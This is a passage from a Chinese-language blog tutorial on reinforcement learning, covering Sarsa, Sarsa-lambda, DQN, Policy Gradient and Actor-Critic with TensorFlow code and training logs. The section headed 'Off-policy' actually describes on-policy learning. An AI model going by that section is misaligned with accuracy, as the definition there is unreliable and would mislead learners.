update(): # 更新环境函数    for episode in range(100):        stepCounter = 0        state = env.reset() # 获取初始状态        action = RL.chooseAction(str(state)) # 获取初始行为        while True:            env.render() # 更新环境            state_, reward, isDone = env.step(action) # 执行当前行为并获取下一状态            action_ = RL.chooseAction(str(state_)) # 选择下一个行为Action            RL.learn(str(state), action, reward, str(state_), action_) # 学习并更新Q表            state = state_ # 更新下一个状态State            action = action_ # 更新下一个行为Action            stepCounter += 1            if isDone:                break        if reward == 1:            print(&#39;[+] Success! Episode %s: total_steps = %s&#39; % (episode + 1, stepCounter))        elif reward == -1:            print(&#39;[!] Failed... Episode %s: total_steps = %s&#39; % (episode + 1, stepCounter))    print(&#39;[*] Done&#39;)    env.destroy()if __name__ == &#39;__main__&#39;:    env = Maze()    RL = SarsaTable(actions=list(range(env.nActions)))    env.after(100, update)    env.mainloop()</code></pre><p>学习效果：</p><pre><code class="bash">$ $ ./Sarsa.py[!] Failed... Episode 1: total_steps = 7[!] Failed... Episode 2: total_steps = 11[!] Failed... Episode 3: total_steps = 31[!] Failed... Episode 4: total_steps = 45[+] Success! Episode 5: total_steps = 84[!] Failed... Episode 6: total_steps = 73[+] Success! Episode 7: total_steps = 36[+] Success! Episode 8: total_steps = 82[+] Success! Episode 9: total_steps = 33[+] Success! Episode 10: total_steps = 48[+] Success! Episode 11: total_steps = 61[+] Success! Episode 12: total_steps = 8[+] Success! Episode 13: total_steps = 8[+] Success! Episode 14: total_steps = 6[+] Success! Episode 15: total_steps = 6[+] Success! Episode 16: total_steps = 6[+] Success! Episode 17: total_steps = 11[!] Failed... Episode 18: total_steps = 6[+] Success! Episode 19: total_steps = 7[+] Success! Episode 20: total_steps = 6[+] Success! Episode 21: total_steps = 6[+] Success! Episode 22: total_steps = 6[+] Success! Episode 23: total_steps = 8[+] Success! Episode 24: total_steps = 6[+] Success! Episode 25: total_steps = 6[+] Success! Episode 26: total_steps = 6[+] Success! Episode 27: total_steps = 6[+] Success! Episode 28: total_steps = 6...</code></pre><h2 id="Off-policy-1"><a href="#Off-policy-1" class="headerlink" title="Off-policy"></a>Off-policy</h2><p>生成样本的 Policy（Value Function）跟网络更新参数时使用的 Policy（Value Function）相同。典型为 SARAS 算法，基于当前的 Policy 直接执行一次动作选择，然后用这个样本更新当前的 Policy。</p><p>该方法会遭遇探索-利用的矛盾，光利用目前已知的最优选择，可能学不到最优解，收敛到局部最优，而加入探索又降低了学习效率。epsilon-greedy 算法是这种矛盾下的折衷。优点是直接了当，速度快，劣势是不一定找到最优策略。</p><h2 id="Sarsa-lambda"><a href="#Sarsa-lambda" class="headerlink" title="Sarsa-lambda"></a><a href="https://blog.csdn.net/u010089444/article/details/80516345" target="_blank" rel="noopener">Sarsa-lambda</a></h2><p>Sarsa-lambda 算法是 Sarsa 的改进版。在每次获得 Reward 后，Sarsa 只对前一步的 Q 值进行更新，Sarsa-lambda 则会对获得 Reward 之前所有的 Q 值进行更新。</p><p>$$<br>\begin{array}{l}<br>Initialize\ Q(s,a)\ arbitrarily,for\ all\ s\in S,a\in A(s)\\<br>Repeat\ (for\ each\ episode):\\<br>\quad E(s,a)=0,for\ all\ s\in S,a\in A(s)\\<br>\quad Initialize\ S,A\\<br>\quad Repeat\ (for\ each\ step\ of\ episode):\\<br>\quad\quad Choose\ A’\ from\ S’\ using\ policy\ derived\ from\ Q\ (e.g.,\varepsilon-greedy)\\<br>\quad\quad \delta\leftarrow R+\gamma Q(S’,A’)-Q(S,A)\\<br>\quad\quad E(S,A)\leftarrow E(S,A)+1\\<br>\quad\quad For\ all\ s\in S,a\in A(s):\\<br>\quad\quad\quad Q(s,a)\leftarrow Q(s,a)+\alpha\delta E(s,a)\\<br>\quad\quad\quad E(s,a)\leftarrow \gamma\lambda E(s,a)\\<br>\quad\quad S\leftarrow S’;\ A\leftarrow A’;\\<br>\quad until\ S\ is\ terminal<br>\end{array}<br>$$</p><p>Sarsa-lambda 中新增了一个矩阵 Eligibility Trace，用于保存在路径中的每一步，这样就能更新前面的每一步的 Q 值。其中 $\lambda\in[0,1]$，如果 $\lambda=0$，就会退化为 Sarsa 算法；如果 $\lambda=1$，每次更新就会完全考虑到前面的每一步。</p><h3 id="Programming-2"><a href="#Programming-2" class="headerlink" title="Programming"></a>Programming</h3><p>对 Sarsa 进行一定的修改：</p><pre><code class="python">...class SarsaLambdaTable(RL):    def __init__(self, actions, learningRate=0.01, rewardDecay=0.9, greedyPolicy=0.9, traceDecay=0.9):        super(SarsaLambdaTable, self).__init__(actions, learningRate, rewardDecay, greedyPolicy)        self.lambda_ = traceDecay # 步数的衰减值        self.eligibilityTrace = self.qTable.copy() # 矩阵Eligibility Trace    def checkStateExists(self, state): # 检查状态State是否存在        if state not in self.qTable.index:            toBeAppend = pd.Series([0] * len(self.actions), index=self.qTable.columns, name=state) # 若不存在，新增一列            self.qTable = self.qTable.append(toBeAppend) # 更新Q表            self.eligibilityTrace = self.eligibilityTrace.append(toBeAppend) # 更新E表    def learn(self, s, a, r, s_, a_):        self.checkStateExists(s_)        qPred = self.qTable.loc[s, a] # 预测Q值        if s_ != &#39;terminated&#39;:            qTarget = r + self.gamma * self.qTable.loc[s_, a_] # 计算实际Q值        else:            qTarget = r        error = qTarget - qPred # 计算实际值和预测值的差值        # Method 1        #self.eligibilityTrace.loc[s, a] += 1        # Method 2        self.eligibilityTrace.loc[s, :] *= 0        self.eligibilityTrace.loc[s, a] = 1        self.qTable += self.lr * error * self.eligibilityTrace # 更新Q表        self.eligibilityTrace *= self.gamma * self.lambda_ # 更新E表def update():    for episode in range(100):        stepCounter = 0        observation = env.reset()        action = RL.chooseAction(str(observation))        while True:            env.render()            observation_, reward, isDone = env.step(action)            action_ = RL.chooseAction(str(observation_))            RL.learn(str(observation), action, reward, str(observation_), action_)            observation = observation_            action = action_            stepCounter += 1            if isDone:                break        if reward == 1:            print(&#39;[+] Success! Episode %s: total_steps = %s&#39; % (episode + 1, stepCounter))        elif reward == -1:            print(&#39;[!] Failed... Episode %s: total_steps = %s&#39; % (episode + 1, stepCounter))    print(&#39;[*] Done&#39;)    env.destroy()...</code></pre><p>学习效果（收敛较慢）：</p><pre><code class="bash">$ ./Sarsa-lambda.py[!] Failed... Episode 1: total_steps = 6[!] Failed... Episode 2: total_steps = 27[!] Failed... Episode 3: total_steps = 43[+] Success! Episode 4: total_steps = 230[!] Failed... Episode 5: total_steps = 190[+] Success! Episode 6: total_steps = 40[+] Success! Episode 7: total_steps = 52[+] Success! Episode 8: total_steps = 155[+] Success! Episode 9: total_steps = 46[+] Success! Episode 10: total_steps = 44[+] Success! Episode 11: total_steps = 32[+] Success! Episode 12: total_steps = 21...[+] Success! Episode 64: total_steps = 8[+] Success! Episode 65: total_steps = 8[+] Success! Episode 66: total_steps = 6[+] Success! Episode 67: total_steps = 6...</code></pre><h1 id="Deep-Q-Network（DQN）"><a href="#Deep-Q-Network（DQN）" class="headerlink" title="Deep Q Network（DQN）"></a><a href="https://blog.csdn.net/qq_30615903/article/details/80744083" target="_blank" rel="noopener">Deep Q Network（DQN）</a></h1><p>由于在大量状态和行为的情况下，Q Learning 等一系列基于价值的算法不能很好地进行学习，衍生出了一种和神经网络结合的算法。</p><p>$$<br>\begin{array}{l}<br>Initialize\ replay\ memory\ D\ to\ capacity\ N\\<br>Initialize\ action-value\ function\ Q\ with\ random\ weights\ \theta\\<br>Initialize\ target\ action-value\ function\ \hat{Q}\ with\ weights\ \theta^-=\theta\\<br>For\ episode=1,M\ do\\<br>\quad Initialize\ sequence\ s_1={x_1}\ and\ preprocessed\ sequence\ \phi_1=\phi(s_1)\\<br>\quad For\ t=1,T\ do\\<br>\quad\quad With\ probability\ \varepsilon\ select\ a\ random\ action\ a_t\\<br>\quad\quad otherwise\ select\ a_t=argmax_aQ(\phi(s_t),a;\theta)\\<br>\quad\quad Execute\ action\ a_t\ in\ emulator\ and\ observe\ reward\ r_t\ and image\ x_{t+1}\\<br>\quad\quad Set\ s_{t+1}=s_t,a_t,x_{t+1}\ and\ preprocess\ \phi_{t+1}=\phi(s_{t+1})\\<br>\quad\quad Store\ transition\ (\phi_t,a_t,r_t,\phi_{t+1})\ in\ D\\<br>\quad\quad Sample\ random\ minibatch\ of\ transitions\ (\phi_j,a_j,r_j,\phi_{j+1})\ from\ D\\<br>\quad\quad Set\ y_j=\begin{cases}r_j, &amp; if\ episode\ terminates\ at\ step\ j+1\\ r_j+\gamma max_{a’}\hat{Q}(\phi_{j+1},a’;\phi^-), &amp; otherwise\end{cases}\\<br>\quad\quad Perform\ a\ gradient\ descent\ step\ on\ (y_j-Q(\phi(j),a_j;\theta))^2\ with\ respect\ to\ the\\<br>\quad\quad network\ paramters\ \theta\\<br>\quad\quad Every\ C\ steps\ reset\ \hat{Q}=Q\\<br>\quad End\ For\\<br>End\ For<br>\end{array}<br>$$</p><blockquote><p>PS：下面公式中的 $max_a$ 均表示 $max_{a’}$，不知道为什么 MathJax 不能正常显示下面带单引号的公式（在中括号 $[]$ 之间的部分）。有了解的师傅欢迎联系我。</p></blockquote><p>定义：</p><p>$$<br>Q^*=\max_{\pi}\mathbb{E}[\sum_{t=0}^{+\infty}\vert\gamma^tr_t\vert s_0=s,a_0=a,\pi]<br>$$</p><p>则有 Bellman Equation：</p><p>$$<br>Q^*(s,a)=\mathbb{E}_{s’\sim\varepsilon}[r+\gamma max_aQ^*(s’,a’)\vert s,a]<br>$$</p><p>用深度神经网络来模拟 $Q^*(s,a)$，其中 $\theta$ 为权重：</p><p>$$<br>Q(s,a;\theta)\approx Q^*(s,a)<br>$$</p><p>根据 Bellman Equation 得出以下神经网络：</p><ul><li>前向计算：$L_i(\theta_i)=\mathbb{E}_{s,a\sim\rho(\cdot)}[(y_i-Q(s,a;\theta_i))^2]$，其中 $y_i=\mathbb{E}_{s’\sim\epsilon}[r+\gamma max_aQ(s’,a’;\theta_{i-1})\vert s,a]$；</li><li>后向传播：$\nabla_{\theta_i}L_i(\theta_i)=\mathbb{E}_{s,a\sim\rho(\cdot);s’\sim\varepsilon}[r+\gamma max_aQ(s’,a’;\theta_{i-1})-Q(s,a;\theta_i)\nabla_{\theta_i}Q(s,a;\theta_i)]$。</li></ul><p>TODO</p><p><img src="/pics/Reinforcement-Learning/1.png" srcset="/img/loading.gif" alt></p><h2 id="Programming-3"><a href="#Programming-3" class="headerlink" title="Programming"></a>Programming</h2><p>利用 OpenAI 的 gym 库对 DQN 进行测试：</p><pre><code class="python">#!/usr/bin/env python3import numpy as npimport pandas as pdimport tensorflow.compat.v1 as tftf.disable_v2_behavior()import gymimport matplotlib.pyplot as pltclass DeepQNetwork:    def __init__(self, nActions, nFeatures, learningRate=0.01, rewardDecay=0.9, eGreedy=0.9, replaceTargetIter=300, memorySize=500, batchSize=32, eGreedyIncrement=None, outputGraph=False):        self.nActions = nActions # 动作数        self.nFeatures = nFeatures # 神经网络的特征数        self.lr = learningRate # 学习率        self.gamma = rewardDecay # 奖励衰减项        self.epsilonMax = eGreedy # 贪婪系数最大值        self.replaceTargetIter = replaceTargetIter # 更新targetNet的步数        self.memorySize = memorySize # 用于记忆的数据数量        self.batchSize = batchSize # Batch大小        self.epsilonIncrement = eGreedyIncrement # 贪婪系数变化率        self.epsilon = 0 if eGreedyIncrement is not None else self.epsilonMax # 贪婪系数        self.learnStepCounter = 0 # 记录学习的步数        self.memory = np.zeros((self.memorySize, nFeatures * 2 + 2)) # 创建存储空间        self.buildNet() # 建立网络        tParams = tf.get_collection(&#39;targetNetParams&#39;) # 获取targetNet中的参数        eParams = tf.get_collection(&#39;evalNetParams&#39;) # 获取evalNet中的参数        self.replaceTargetOp = [tf.assign(t, e) for t, e in zip(tParams, eParams)] # 将targetNet中的参数替换为evalNet中的参数        self.sess = tf.Session()        if outputGraph:            tf.summary.FileWriter(&#39;log/&#39;, self.sess.graph)        self.sess.run(tf.global_variables_initializer()) # 激活变量        self.costHis = [] # 记录误差    def buildNet(self):        # Build evalNet        self.s = tf.placeholder(tf.float32, [None, self.nFeatures], name=&#39;s&#39;) # 输入1：当前的状态State        self.qTarget = tf.placeholder(tf.float32, [None, self.nActions], name=&#39;qTarget&#39;) # 输入2：现实Q值        with tf.variable_scope(&#39;evalNet&#39;):            cNames = [&#39;evalNetParams&#39;, tf.GraphKeys.GLOBAL_VARIABLES] # 用于收集evalNet中所有的参数            nL1 = 10 # 第一层神经元个数            wInitializer = tf.random_normal_initializer(0., 0.3) # 随机生成权重            bInitializer = tf.constant_initializer(0.1) # 随机生成偏置            with tf.variable_scope(&#39;l1&#39;): # 第一层                w1 = tf.get_variable(&#39;w1&#39;, [self.nFeatures, nL1], initializer=wInitializer, collections=cNames) # 权重                b1 = tf.get_variable(&#39;b1&#39;, [1, nL1], initializer=bInitializer, collections=cNames) # 偏置                l1 = tf.nn.relu(tf.matmul(self.s, w1) + b1) # 激励函数使用ReLU            with tf.variable_scope(&#39;l2&#39;): # 第二层                w2 = tf.get_variable(&#39;w2&#39;, [nL1, self.nActions], initializer=wInitializer, collections=cNames) # 权重                b2 = tf.get_variable(&#39;b2&#39;, [1, self.nActions], initializer=bInitializer, collections=cNames) # 偏置                self.qEval = tf.matmul(l1, w2) + b2 # 估计的Q值        with tf.variable_scope(&#39;loss&#39;):            self.loss = tf.reduce_mean(tf.squared_difference(self.qTarget, self.qEval))        with tf.variable_scope(&#39;train&#39;):            self.trainOp = tf.train.RMSPropOptimizer(self.lr).minimize(self.loss)        # Build targetNet        self.s_ = tf.placeholder(tf.float32, [None, self.nFeatures], name=&#39;s_&#39;) # 输入1：下一个状态State        with tf.variable_scope(&#39;targetNet&#39;):            cNames = [&#39;targetNetParams&#39;, tf.GraphKeys.GLOBAL_VARIABLES] # 用于收集targetNet中所有的参数            with tf.variable_scope(&#39;l1&#39;): # 第一层                w1 = tf.get_variable(&#39;w1&#39;, [self.nFeatures, nL1], initializer=wInitializer, collections=cNames) # 权重                b1 = tf.get_variable(&#39;b1&#39;, [1, nL1], initializer=bInitializer, collections=cNames) # 偏置                l1 = tf.nn.relu(tf.matmul(self.s_, w1) + b1) # 激励函数使用ReLU            with tf.variable_scope(&#39;l2&#39;): # 第二层                w2 = tf.get_variable(&#39;w2&#39;, [nL1, self.nActions], initializer=wInitializer, collections=cNames) # 权重                b2 = tf.get_variable(&#39;b2&#39;, [1, self.nActions], initializer=bInitializer, collections=cNames) # 偏置                self.qNext = tf.matmul(l1, w2) + b2 # 估计的Q值    def storeTransition(self, s, a, r, s_):        if not hasattr(self, &#39;memoryCounter&#39;):            self.memoryCounter = 0        transition = np.hstack((s, [a, r], s_))        idx = self.memoryCounter % self.memorySize        self.memory[idx, :] = transition        self.memoryCounter += 1    def chooseAction(self, observation): # 选择行为Action        observation = observation[np.newaxis, :] # 变成二维矩阵便于处理        if np.random.rand() &lt; self.epsilon:            actionsValue = self.sess.run(self.qEval, feed_dict={self.s: observation}) # 放入evalNet中分析计算行为的值            action = np.argmax(actionsValue) # 选择值最大的行为Action        else:            action = np.random.randint(0, self.nActions) # 10%的概率随机选择行为Action        return action    def learn(self):        if self.learnStepCounter % self.replaceTargetIter == 0: # 判断学习之前是否需要替换参数            self.sess.run(self.replaceTargetOp)            print(&#39;[+] Target params replaced.&#39;)        if self.memoryCounter &gt; self.memorySize: # 判断存储空间中的数据数量            sampleIdx = np.random.choice(self.memorySize, size=self.batchSize)        else:            sampleIdx = np.random.choice(self.memoryCounter, size=self.batchSize)        batchMemory = self.memory[sampleIdx, :] # 获取一部分数据作为Batch        qNext, qEval = self.sess.run([self.qNext, self.qEval], feed_dict={self.s_: batchMemory[:, -self.nFeatures:], self.s: batchMemory[:, :self.nFeatures]}) # 分别计算当前状态和下一状态的Q值        qTarget = qEval.copy() #        batchIdx = np.arange(self.batchSize, dtype=np.int32)        evalActIdx = batchMemory[:, self.nFeatures].astype(int)        reward = batchMemory[:, self.nFeatures + 1]        qTarget[batchIdx, evalActIdx] = reward + self.gamma * np.max(qNext, axis=1)        _, self.cost = self.sess.run([self.trainOp, self.loss], feed_dict={self.s: batchMemory[:, :self.nFeatures], self.qTarget: qTarget}) # 计算误差值        self.costHis.append(self.cost) # 存储误差值        self.epsilon = self.epsilon + self.epsilonIncrement if self.epsilon &lt; self.epsilonMax else self.epsilonMax # 更新贪婪系数        self.learnStepCounter += 1    def plotCost(self): # 展示误差        plt.plot(np.arange(len(self.costHis)), self.costHis)        plt.ylabel(&#39;Cost&#39;)        plt.xlabel(&#39;Training Steps&#39;)        plt.show()if __name__ == &#39;__main__&#39;:    env = gym.make(&#39;CartPole-v0&#39;)    print(env.action_space)    print(env.observation_space)    print(env.observation_space.high)    print(env.observation_space.low)    totalStep = 0    RL = DeepQNetwork(nActions=env.action_space.n, nFeatures=env.observation_space.shape[0], learningRate=0.01, eGreedy=0.9, replaceTargetIter=100, memorySize=2000, eGreedyIncrement=0.001)    for episode in range(100):        observation = env.reset() # 获取第一个状态        episodeReward = 0        while True:            env.render()            action = RL.chooseAction(observation) # 选择行为Actor            observation_, reward, isDone, info = env.step(action) # 获取执行行为后得到的相关信息            x, xDot, theta, thetaDot = observation_            r1 = (env.x_threshold - abs(x)) / env.x_threshold - 0.8 # 根据离画面中心距离判断奖励值            r2 = (env.theta_threshold_radians - abs(theta)) / env.theta_threshold_radians - 0.5 # 根据杆子偏离度判断奖励值            reward = r1 + r2 # 替换奖励值            RL.storeTransition(observation, action, reward, observation_) # 存储步骤            episodeReward += reward # 更新奖励值            if totalStep &gt; 1000:                RL.learn() # 学习            if isDone:                print(&#39;[+] episode: {}, episodeReward: {}, epsilon: {}&#39;.format(episode, episodeReward, RL.epsilon)) # 输出                break            observation = observation_            totalStep += 1    RL.plotCost() # 绘制误差图</code></pre><p>学习效果，最终会收敛到最合适的 $\varepsilon$ 对应的值：</p><pre><code class="bash">$ ./DQN.py...Discrete(2)Box(4,)[4.8000002e+00 3.4028235e+38 4.1887903e-01 3.4028235e+38][-4.8000002e+00 -3.4028235e+38 -4.1887903e-01 -3.4028235e+38]...[+] episode: 0, episodeReward: 8.962128355556148, epsilon: 0[+] episode: 1, episodeReward: 5.262074725675638, epsilon: 0[+] episode: 2, episodeReward: 4.771817696346831, epsilon: 0[+] episode: 3, episodeReward: 3.6815099553712423, epsilon: 0[+] episode: 4, episodeReward: 2.0117216279281562, epsilon: 0[+] episode: 5, episodeReward: 14.986124067404067, epsilon: 0[+] episode: 6, episodeReward: 5.049683281727361, epsilon: 0...[+] episode: 50, episodeReward: 7.6161165056296385, epsilon: 0[+] episode: 51, episodeReward: 7.366432746086161, epsilon: 0[+] Target params replaced.[+] episode: 52, episodeReward: 12.517630447631952, epsilon: 0.009000000000000001[+] episode: 53, episodeReward: 3.090222284801366, epsilon: 0.022000000000000013[+] episode: 54, episodeReward: 4.435946584693391, epsilon: 0.04300000000000003[+] episode: 55, episodeReward: 5.469698721962921, epsilon: 0.07000000000000005[+] episode: 56, episodeReward: 2.2975027875220384, epsilon: 0.08500000000000006[+] Target params replaced.[+] episode: 57, episodeReward: 3.042176076066822, epsilon: 0.10700000000000008[+] episode: 58, episodeReward: 18.75897216435803, epsilon: 0.1480000000000001...[+] Target params replaced.[+] episode: 97, episodeReward: 112.18733630622428, epsilon: 0.9[+] Target params replaced.[+] Target params replaced.[+] episode: 98, episodeReward: 126.81607918996532, epsilon: 0.9[+] Target params replaced.[+] Target params replaced.[+] episode: 99, episodeReward: 126.65358872838634, epsilon: 0.9</code></pre><p>误差趋势图：</p><p><img src="/pics/Reinforcement-Learning/2.png" srcset="/img/loading.gif" alt></p><h1 id="Policy-Gradience"><a href="#Policy-Gradience" class="headerlink" title="Policy Gradience"></a><a href="https://blog.csdn.net/qq_30615903/article/details/80747380" target="_blank" rel="noopener">Policy Gradience</a></h1><p>$$<br>\begin{array}{l}<br>Initialize\ \theta\ arbitrarily\\<br>For\ each\ episode\ {s_1,a_1,r_2,\cdots,s_{T-1},a_{T-1},r_T}\sim\pi do\\<br>\quad For\ t=1\ to\ T-1\ do\\<br>\quad\quad \theta\leftarrow+\alpha\nabla_\theta\log\pi_\theta(s_t,a_t)v_t\\<br>\quad End\ For\\<br>End\ For<br>\end{array}<br>$$</p><p>Policy Gradience 主要思想：在每一个状态下，根据现有 $P(a_t,s_t)$ 采样 $a_t$，如此往复，获得一组状态-行为对：$s_1,a_1,s_2,a_2,\cdots,s_T$，此时获得最终的奖励函数 $r_T$，这里我们假设 $r_T$ 可取正负值，其中正值表示获得奖励，负值表示获得惩罚。最终可以根据 $r_T$ 去修改每一步的 $P(a_t,s_t)$：</p><p>$$<br>P(a_t\vert s_t)=P(a_t\vert s_t)+\alpha r_T<br>$$</p><p>如果 $P(a_t\vert s_t)\sim Q(s_t,a_t,\theta)$，则有：</p><p>$$<br>\theta=\theta+\alpha r_t\nabla_\theta Q(s_t,a_t,\theta)<br>$$</p><p>Policy Gradience 的改进：上述算法的缺点是，我们需要非常精确地设置 $r_T$ 的值，否则很可能出现 $P$ 一直上涨或一直下降。一个主要的改进如下：</p><p>$$<br>\begin{array}{cc}<br>P(a_t\vert s_t)=P(a_t\vert s_t)+\alpha(r_T-V(s_t))\\<br>\theta=\theta+\alpha(r_T-V(s_t))\nabla_\theta Q(s_t,a_t,\theta)<br>\end{array}<br>$$</p><p>$V(s)$ 是估值函数：</p><p>$$<br>V(s)=\mathbb{E}[\sum_{t≥0}\gamma^tr_t\vert s_0=s,\pi]<br>$$</p><p>它代表了在 $t$ 时刻对最终 Reward 的估计（可以采用深度神经网络求 $V(s)=V(s,\theta)$）。</p><p><img src="/pics/Reinforcement-Learning/3.png" srcset="/img/loading.gif" alt></p><h2 id="Programming-4"><a href="#Programming-4" class="headerlink" title="Programming"></a>Programming</h2><p>利用 Policy Gradient 实现对 GYM 库中 CartPole 游戏的学习：</p><pre><code class="python">#!/usr/bin/env python3import numpy as npimport pandas as pdimport tensorflow.compat.v1 as tftf.disable_v2_behavior()import gymimport matplotlib.pyplot as pltDISPLAY_REWARD_THRESHOLD = 400 # renders environment if total episode reward is greater then this thresholdRENDER = False # rendering wastes timeclass PolicyGradient:    def __init__(self, nActions, nFeatures, learningRate=0.01, rewardDecay=0.95, outputGraph=False):        self.nActions = nActions        self.nFeatures = nFeatures        self.lr = learningRate        self.gamma = rewardDecay        self.episodeObs, self.episodeAs, self.episodeRs = [], [], []        self.buildNet()        self.sess = tf.Session()        if outputGraph:            tf.summary.FileWriter(&#39;log/&#39;, self.sess.graph)            print(&#39;[+] TensorBoard built successfully&#39;)        self.sess.run(tf.global_variables_initializer())    def buildNet(self): # 建立神经网络        with tf.name_scope(&#39;inputs&#39;):            self.tfObs = tf.placeholder(tf.float32, [None, self.nFeatures], name=&#39;observations&#39;)            self.tfActs = tf.placeholder(tf.int32, [None], name=&#39;actionsNum&#39;)            self.tfVt = tf.placeholder(tf.float32, [None], name=&#39;actionsValue&#39;)        # fc1        layer = tf.layers.dense(inputs=self.tfObs, units=10, activation=tf.nn.tanh, kernel_initializer=tf.random_normal_initializer(mean=0, stddev=0.3), bias_initializer=tf.constant_initializer(0.1), name=&#39;fc1&#39;) # 全连接层        allAct = tf.layers.dense(inputs=layer, units=self.nActions, activation=None, kernel_initializer=tf.random_normal_initializer(mean=0, stddev=0.3), bias_initializer=tf.constant_initializer(0.1), name=&#39;fc2&#39;) # 全连接层        self.allActProb = tf.nn.softmax(allAct, name=&#39;actProb&#39;) # 求出行为对应的概率        with tf.name_scope(&#39;loss&#39;): # 计算误差            negLogProb = tf.nn.sparse_softmax_cross_entropy_with_logits(logits=allAct, labels=self.tfActs)            #negLogProb = tf.reduce_sum(-tf.log(self.allActProb) * tf.one_hot(self.tfActs, self.tfActs), axis=1) # 将目标函数修改为对最小值的求解            loss = tf.reduce_mean(negLogProb * self.tfVt)        with tf.name_scope(&#39;train&#39;):            self.trainOp = tf.train.AdamOptimizer(self.lr).minimize(loss)    def chooseAction(self, observation): # 选择行为        probWeights = self.sess.run(self.allActProb, feed_dict={self.tfObs: observation[np.newaxis, :]}) # 获取概率        action = np.random.choice(range(probWeights.shape[1]), p=probWeights.ravel()) # 通过概率选择行为        return action    def storeTransition(self, s, a, r): # 存储回合        self.episodeObs.append(s)        self.episodeAs.append(a)        self.episodeRs.append(r)    def learn(self): # 学习更新参数        discountedEpRsNorm = self.discountAndNormRewards()        self.sess.run(self.trainOp, feed_dict={self.tfObs: np.vstack(self.episodeObs), self.tfActs: np.array(self.episodeAs), self.tfVt: discountedEpRsNorm}) # 训练        self.episodeObs, self.episodeAs, self.episodeRs = [], [], [] # 清空存储空间        return discountedEpRsNorm    def discountAndNormRewards(self): # 衰减回合奖励        discountedEpRs = np.zeros_like(self.episodeRs)        runningAdd = 0        for t in reversed(range(len(self.episodeRs))):            runningAdd = runningAdd * self.gamma + self.episodeRs[t]            discountedEpRs[t] = runningAdd        # 数据归一化        discountedEpRs -= np.mean(discountedEpRs)        discountedEpRs /= np.std(discountedEpRs)        return discountedEpRsif __name__ == &#39;__main__&#39;:    env = gym.make(&#39;CartPole-v0&#39;)    env.seed(1) # reproducible, general Policy gradient has high variance    env = env.unwrapped    RL = PolicyGradient(nActions=env.action_space.n, nFeatures=env.observation_space.shape[0], learningRate=0.02, rewardDecay=0.99)    for episode in range(3000):        observation = env.reset()        while True:            if RENDER:                env.render()            action = RL.chooseAction(observation)            observation_, reward, isDone, info = env.step(action)            RL.storeTransition(observation, action, reward) # 存储当前回合            if isDone:                episodeRsSum = sum(RL.episodeRs)                if &#39;runningReward&#39; not in globals():                    runningReward = episodeRsSum                else:                    runningReward = runningReward * 0.99 + episodeRsSum * 0.01 # 更新奖励                if runningReward &gt; DISPLAY_REWARD_THRESHOLD: # 训练到一定程度                    RENDER = True                print(&#39;[+] episode: {}, reward: {}&#39;.format(episode, runningReward))                vt = RL.learn()                if episode == 0:                    plt.plot(vt) # 绘制回合奖励图                    plt.xlabel(&#39;Episode Steps&#39;)                    plt.ylabel(&#39;Normalized State-action value&#39;)                    plt.show()                break            observation = observation_</code></pre><p>学习效果：</p><pre><code class="bash">$ $ ./Policy-Gradient.py...[+] episode: 0, reward: 20.0[+] episode: 1, reward: 19.990000000000002[+] episode: 2, reward: 20.210100000000004[+] episode: 3, reward: 20.127999000000006[+] episode: 4, reward: 20.116719010000008[+] episode: 5, reward: 20.105551819900008[+] episode: 6, reward: 20.214496301701008[+] episode: 7, reward: 20.142351338683998...[+] episode: 107, reward: 332.15535489983097[+] episode: 108, reward: 341.05380135083266[+] episode: 109, reward: 388.9932633373243[+] episode: 110, reward: 390.75333070395106[+] episode: 111, reward: 446.6457973969116...</code></pre><p><img src="/pics/Reinforcement-Learning/4.png" srcset="/img/loading.gif" alt></p><h1 id="Actor-Critic（基于概率和价值）"><a href="#Actor-Critic（基于概率和价值）" class="headerlink" title="Actor-Critic（基于概率和价值）"></a><a href="https://blog.csdn.net/qq_30615903/article/details/80774384" target="_blank" rel="noopener">Actor-Critic（基于概率和价值）</a></h1><p>$$<br>\begin{array}{l}<br>Input:\ a\ differentiable\ policy\ parameterization\ \pi(a\vert s,\theta)\\<br>Input:\ a\ differentiable\ policy\ parameterization\ \hat{v}(s,\omega)\\<br>Algorithm\ parameters:\ trace-decay\ rates\ \gamma^\theta\in[0,1],\gamma^\omega\in[0,1];\ step\ sizes\ \alpha^\theta&gt;0,\alpha^\omega&gt;0\\<br>Initialize\ policy\ parameter\ \theta\in\mathbb{R}^{d’}\ and\ state-value\ weights\ \omega\in\mathbb{R}^d\ (e.g.,\ to\ 0)\\<br>Loop\ forever\ (for\ each\ episode):\\<br>\quad Initialize\ S\ (first\ state\ of\ episode)\\<br>\quad z^\theta\leftarrow0(d’-component\ eligibility\ trace\ vector)\\<br>\quad z^\omega\leftarrow0(d-component\ eligibility\ trace\ vector)\\<br>\quad I\leftarrow0\\<br>Loop\ while\ S\ is\ not\ terminal\ (for\ each\ time\ step):\\<br>\quad\quad A\sim\pi(\cdot\vert S,\theta)\\<br>\quad\quad Take\ action\ A,\ observe\ S’,R\\<br>\quad\quad \delta\leftarrow R+\gamma\hat{v}(S’,\omega)-\hat{v}(S,\omega)\\<br>\quad\quad z^\omega\leftarrow\gamma\lambda^\omega z^\omega+I\nabla_\omega\hat{v}(S,\omega)\\<br>\quad\quad z^\theta\leftarrow\gamma\lambda^\theta z^\theta+I\nabla_\theta\ln\pi(A\vert S,\theta) \\<br>\quad\quad \omega\leftarrow\omega+\alpha^\omega\delta z^\omega \\<br>\quad\quad \theta\leftarrow\theta+\alpha^\theta\delta z^\theta \\<br>\quad\quad I\leftarrow\gamma I \\<br>\quad\quad S\leftarrow S’ \\<br>\end{array}<br>$$</p><p>Actor-Critic 算法分为两部分，Actor 的前身是 Policy Gradient，可以在连续动作空间内选择合适的动作，由于 Actor 基于回合更新的所以学习效率比较慢；基于价值的 Q Learning 作为 Critic 的算法实现单步更新，对 Actor 的行为进行评分，Actor 再根据评分修改行为的概率。</p><h2 id="Shortcomings-1"><a href="#Shortcomings-1" class="headerlink" title="Shortcomings"></a>Shortcomings</h2><p>Actor 的行为取决于 Critic 的 Value，但因为 Critic 本身就很难收敛和 Actor 一起更新的话就更难收敛了。</p><h2 id="Programming-5"><a href="#Programming-5" class="headerlink" title="Programming"></a>Programming</h2><p>使用 Actor-Critic 算法对游戏 CartPole 进行学习：</p><pre><code class="python">#!/usr/bin/env python3import numpy as npimport tensorflow.compat.v1 as tftf.disable_v2_behavior()import gymOUTPUT_GRAPH = FalseMAX_EPISODE = 3000DISPLAY_REWARD_THRESHOLD = 200MAX_EP_STEPS = 1000RENDER = FalseGAMMA = 0.9 # 贪婪系数LR_A = 0.001 # Learning Rate of ActorLR_C = 0.01 # Learning Rate of Criticclass Actor(object):    def 